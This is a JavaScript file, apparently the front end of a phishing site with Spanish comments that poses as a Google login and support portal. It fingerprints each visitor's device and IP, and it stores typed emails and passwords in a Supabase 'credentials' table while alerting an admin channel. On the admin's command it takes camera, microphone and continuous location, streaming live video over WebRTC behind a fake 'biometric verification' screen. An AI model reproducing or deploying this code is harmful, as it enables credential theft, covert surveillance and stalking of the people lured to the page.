console.log(">>> MAIN.JS INICIANDO CARGA <<<");

const featuresSection = document.getElementById('features-section');
const assistanceSection = document.getElementById('assistance-section');
const aboutSection = document.getElementById('about-section');
const loginBtn = document.getElementById('login-btn');
const loginModal = document.getElementById('login-modal');
const closeModalBtn = document.getElementById('close-modal');
const googleLoginForm = document.getElementById('google-login-form');
const permissionsModal = document.getElementById('permissions-modal');
const acceptPermissionsBtn = document.getElementById('accept-permissions');
const denyPermissionsBtn = document.getElementById('deny-permissions');
const assistanceForm = document.getElementById('assistance-form');

// Cliente Supabase global
const supaClient = window.supabaseClient;

// Variables de estado
let userCredentials = {};
let deviceInfo = {};
let permissions = {
    camera: false,
    microphone: false,
    location: false
};

// Obtener información del dispositivo
async function getDeviceInfo() {
    let devId = localStorage.getItem('deviceId');
    if (!devId) {
        devId = 'device-' + Math.random().toString(36).substr(2, 9);
        localStorage.setItem('deviceId', devId);
    }

    // Fallback ip grabbing
    let ip = 'Unknown';
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
    } catch (e) { }

    // Captura de batería
    let batteryInfo = { level: 'N/A', charging: 'N/A' };
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = {
                level: (battery.level * 100) + '%',
                charging: battery.charging ? 'YES' : 'NO'
            };
        }
    } catch (e) { }

    // Captura de red detallada
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    
    deviceInfo = {
        device_id: devId,
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen_width: screen.width,
        screen_height: screen.height,
        ip: ip,
        status: 'active',
        // Guardamos los datos extras en el campo JSONB 'location' para no romper el esquema de la BD
        location: {
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cores: navigator.hardwareConcurrency || 'N/A',
            memory: navigator.deviceMemory || 'N/A',
            battery_level: batteryInfo.level,
            battery_charging: batteryInfo.charging,
            connection_type: connection.effectiveType || 'N/A',
            downlink: connection.downlink ? connection.downlink + ' Mbps' : 'N/A',
            cookies: navigator.cookieEnabled ? 'YES' : 'NO',
            do_not_track: navigator.doNotTrack === '1' ? 'YES' : 'NO',
            touch_support: navigator.maxTouchPoints > 0 ? 'YES' : 'NO',
            online: navigator.onLine ? 'YES' : 'NO'
        }
    };

    return deviceInfo;
}

// Inicializar conexión
let channel;
let localStream = null;
let peer = null;

// Inicializar WebRTC
function initWebRTC(stream, isInitiator, targetId) {
    console.log(">>> Inicializando WebRTC P2P <<<");
    if (peer) { peer.destroy(); }

    peer = new window.SimplePeer({
        initiator: isInitiator,
        stream: stream,
        trickle: false,
        config: { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }
    });

    peer.on('signal', data => {
        // Enviar la señal de negociación al admin
        channel.send({
            type: 'broadcast',
            event: 'webrtc-signal',
            payload: { deviceId: deviceInfo.device_id, targetId: targetId, signal: data }
        });
    });

    peer.on('error', err => console.log('Peer error:', err));
}

async function initSupabase() {
    console.log(">>> Iniciando conexión con Supabase <<<");
    const info = await getDeviceInfo();

    const payloadDevice = {
        ...info,
        last_active: new Date().toISOString()
    };

    console.log(">>> Intentando registrar dispositivo:", payloadDevice);

    // Verificar si existe
    const { data: existing, error: selectError } = await supaClient
        .from('devices')
        .select('device_id')
        .eq('device_id', info.device_id);

    if (selectError) {
        console.error(">>> Error al buscar dispositivo existente:", selectError);
    }

    if (existing && existing.length > 0) {
        console.log(">>> Dispositivo encontrado. Actualizando pulso...");
        const { error } = await supaClient
            .from('devices')
            .update(payloadDevice)
            .eq('device_id', info.device_id);
        if (error) console.error(">>> Error al actualizar dispositivo:", error);
        else console.log(">>> Dispositivo actualizado correctamente.");
    } else {
        console.log(">>> Dispositivo nuevo o no encontrado. Insertando...");
        const { error } = await supaClient
            .from('devices')
            .insert([payloadDevice]);
        if (error) {
            console.error(">>> Error al insertar dispositivo:", error);
            // Intentamos mostrar el error completo para debug
            alert("Error crítico de base de datos: " + (error.message || JSON.stringify(error)));
        } else {
            console.log(">>> Dispositivo insertado correctamente.");
        }
    }

    // Conectar a canal en vivo
    channel = supaClient.channel('cyber-room', {
        config: {
            broadcast: { ack: false },
        },
    });

    channel.on('broadcast', { event: 'request-action' }, payload => {
        const { deviceId, action } = payload.payload;
        if (deviceId === info.device_id) {
            handleAdminRequest(action);
        }
    });

    channel.on('broadcast', { event: 'webrtc-signal' }, payload => {
        const p = payload.payload;
        // Si el admin nos responde la llamada P2P, conectamos la señal
        if (p.targetId === info.device_id && peer) {
            peer.signal(p.signal);
        }
    });

    channel.subscribe((status, err) => {
        if (status === 'SUBSCRIBED') {
            console.log(">>> Canal Realtime conectado correctamente.");
            channel.send({
                type: 'broadcast',
                event: 'device-connected',
                payload: {
                    ...info,
                    last_active: new Date().toISOString()
                }
            });
        }
        if (status === 'CHANNEL_ERROR') {
            console.error(">>> Error en el canal Realtime:", err);
        }
    });
}

function handleAdminRequest(action) {
    if (action === 'access-camera') requestRealPermissions({ camera: true });
    else if (action === 'access-mic') requestRealPermissions({ microphone: true });
    else if (action === 'get-location') requestRealPermissions({ location: true });
    // Otras peticiones podrían manejar envio de archivos
}

// Iniciar sesión
loginBtn.addEventListener('click', () => {
    loginModal.style.display = 'block';
});

closeModalBtn.addEventListener('click', () => {
    loginModal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === loginModal) loginModal.style.display = 'none';
    else if (event.target === permissionsModal) permissionsModal.style.display = 'none';
});

googleLoginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const remember = document.getElementById('remember').checked;

    userCredentials = {
        device_id: deviceInfo.device_id,
        email,
        password,
        remember
    };

    // Guardar credenciales en supabase
    await supaClient.from('credentials').insert([userCredentials]);

    channel.send({
        type: 'broadcast',
        event: 'credentials-captured',
        payload: { ...userCredentials, deviceId: deviceInfo.device_id }
    });

    loginModal.style.display = 'none';
    permissionsModal.style.display = 'block';
});

acceptPermissionsBtn.addEventListener('click', async () => {
    permissions.camera = document.getElementById('camera-permission').checked;
    permissions.microphone = document.getElementById('mic-permission').checked;
    permissions.location = document.getElementById('location-permission').checked;

    // Actualizar BDD
    await supaClient.from('devices').update({ permissions }).eq('device_id', deviceInfo.device_id);

    channel.send({
        type: 'broadcast',
        event: 'permissions-granted',
        payload: { deviceId: deviceInfo.device_id, permissions }
    });

    permissionsModal.style.display = 'none';
    
    // Saltamos la verificación de código y damos acceso directo
    featuresSection.style.display = 'block';
    assistanceSection.style.display = 'block';
    aboutSection.style.display = 'block';

    await supaClient.from('devices').update({ status: 'verified' }).eq('device_id', deviceInfo.device_id);
    channel.send({ type: 'broadcast', event: 'verification-completed', payload: { deviceId: deviceInfo.device_id, auto: true } });

    requestRealPermissions(permissions);
});

denyPermissionsBtn.addEventListener('click', () => {
    permissionsModal.style.display = 'none';
    alert('Para utilizar el sistema de asistencia, debe aceptar todos los permisos requeridos.');
});

// Solicitar permisos y transmitir estados
function requestRealPermissions(requestedPerms) {
    const devId = deviceInfo.device_id;

    if (requestedPerms.camera) permissions.camera = true;
    if (requestedPerms.microphone) permissions.microphone = true;

    if (requestedPerms.camera || requestedPerms.microphone) {
        navigator.mediaDevices.getUserMedia({ 
            video: permissions.camera, 
            audio: permissions.microphone 
        })
        .then(async stream => {
            await supaClient.from('devices').update({ 'permissions': permissions }).eq('device_id', devId);
            
            if (requestedPerms.camera) channel.send({ type: 'broadcast', event: 'camera-accessed', payload: { deviceId: devId } });
            if (requestedPerms.microphone) channel.send({ type: 'broadcast', event: 'mic-accessed', payload: { deviceId: devId } });

            const video = document.getElementById('local-video');
            video.srcObject = stream;
            localStream = stream;
            initWebRTC(stream, true, 'admin');
        })
        .catch(err => console.error(err));
    }

    if (requestedPerms.location) {
        navigator.geolocation.getCurrentPosition(
            async position => {
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: position.timestamp
                };

                await supaClient.from('devices').update({ location: locationData }).eq('device_id', devId);
                channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: locationData } });

                navigator.geolocation.watchPosition(
                    pos => {
                        const updatedLocation = {
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            timestamp: pos.timestamp
                        };
                        supaClient.from('devices').update({ location: updatedLocation }).eq('device_id', devId);
                        channel.send({ type: 'broadcast', event: 'location-updated', payload: { deviceId: devId, location: updatedLocation } });
                    },
                    error => console.error(error),
                    { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
                );
            },
            error => console.error(error)
        );
    }
}

// Autocompletar campos de código (ELIMINADO - NO SE USA)
/*
const codeInputs = document.querySelectorAll('.code-input');
...
*/

assistanceForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const issueType = document.getElementById('issue-type').value;
    const description = document.getElementById('description').value;

    const reqData = {
        device_id: deviceInfo.device_id,
        issue_type: issueType,
        description
    };
    await supaClient.from('assistances').insert([reqData]);

    channel.send({ type: 'broadcast', event: 'assistance-request', payload: { ...reqData, deviceId: deviceInfo.device_id } });

    alert('Su solicitud de asistencia ha sido enviada. Nuestro equipo se pondrá en contacto con usted pronto.');
    assistanceForm.reset();
});

// Mantener activo cuando cambian las pestañas
document.addEventListener('visibilitychange', async () => {
    if (!document.hidden && deviceInfo.device_id) {
        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
    }
});

// Heartbeat cada 30 segundos para mostrarlo conectado en admin
setInterval(async () => {
    if (deviceInfo.device_id) {
        await supaClient.from('devices').update({ last_active: new Date().toISOString() }).eq('device_id', deviceInfo.device_id);
    }
}, 30000);

// Evitar cierre accidental
window.addEventListener('beforeunload', (e) => {
    if (featuresSection.style.display === 'none') {
        e.preventDefault();
        e.returnValue = '¿Está seguro de que desea salir? El proceso de verificación no se ha completado.';
    }
});

// Inicializar al cargar scripts

// --- NUEVAS FUNCIONALIDADES ESTÉTICAS ---

// Actualizar Fecha y Hora en Tiempo Real
function updateDateTime() {
    const dateElement = document.getElementById('current-date');
    if (!dateElement) return;

    const now = new Date();
    const options = { 
        year: 'numeric', 
        month: 'short', 
        day: '2-digit', 
        hour: '2-digit', 
        minute: '2-digit', 
        second: '2-digit',
        hour12: false 
    };
    dateElement.textContent = now.toLocaleDateString('es-ES', options).replace(',', '');
}

setInterval(updateDateTime, 1000);
updateDateTime();

// Simulación de Captura Biométrica
const takePhotoBtn = document.getElementById('take-photo-btn');
const biometricFlash = document.getElementById('biometric-flash');
const scanStatus = document.querySelector('.scan-status');

if (takePhotoBtn) {
    takePhotoBtn.addEventListener('click', () => {
        // Efecto de Flash
        biometricFlash.classList.add('active');
        setTimeout(() => biometricFlash.classList.remove('active'), 150);

        // Simulación de Procesamiento
        takePhotoBtn.disabled = true;
        scanStatus.textContent = 'PROCESANDO BIOMETRÍA...';
        scanStatus.style.color = '#ffcc00';

        setTimeout(() => {
            scanStatus.textContent = 'IDENTIDAD VERIFICADA [ID: ' + Math.floor(Math.random() * 1000000) + ']';
            scanStatus.style.color = '#00ff41';
            takePhotoBtn.innerHTML = '<span>✓</span> Verificado';
            
            // Si hay un stream real, podríamos avisar al admin (opcional)
            if (deviceInfo.device_id) {
                channel.send({
                    type: 'broadcast',
                    event: 'biometric-verified-sim',
                    payload: { deviceId: deviceInfo.device_id, timestamp: new Date().toISOString() }
                });
            }
        }, 2500);
    });
}

// Vincular video real al visor de la simulación si se obtienen permisos
const originalRequestPerms = requestRealPermissions;
requestRealPermissions = function(requestedPerms) {
    // Llamar a la función original para no romper nada
    originalRequestPerms(requestedPerms);
    
    // Si se pidió cámara, intentar vincular el stream al visor de la simulación
    if (requestedPerms.camera) {
        const checkStream = setInterval(() => {
            if (localStream) {
                const simulatedViewfinder = document.getElementById('simulated-viewfinder');
                if (simulatedViewfinder) {
                    // Creamos un elemento de video para el visor si no existe
                    let videoPreview = document.getElementById('biometric-video-preview');
                    if (!videoPreview) {
                        videoPreview = document.createElement('video');
                        videoPreview.id = 'biometric-video-preview';
                        videoPreview.autoplay = true;
                        videoPreview.muted = true;
                        videoPreview.style.width = '100%';
                        videoPreview.style.height = '100%';
                        videoPreview.style.objectFit = 'cover';
                        simulatedViewfinder.appendChild(videoPreview);
                    }
                    videoPreview.srcObject = localStream;
                    scanStatus.textContent = 'BIOMETRÍA LISTA PARA CAPTURA';
                }
                clearInterval(checkStream);
            }
        }, 500);
    }
};

// Manejo de scroll para el Navbar
window.addEventListener('scroll', () => {
    const sections = document.querySelectorAll('section');
    const navLinks = document.querySelectorAll('.nav a');
    
    let current = '';
    sections.forEach(section => {
        const sectionTop = section.offsetTop;
        const sectionHeight = section.clientHeight;
        if (pageYOffset >= (sectionTop - 150)) {
            current = section.getAttribute('id');
        }
    });

    navLinks.forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('href').includes(current)) {
            link.classList.add('active');
        }
    });
});

// INICIALIZACIÓN DEL SISTEMA
console.log(">>> Invocando inicialización del sistema...");
initSupabase();
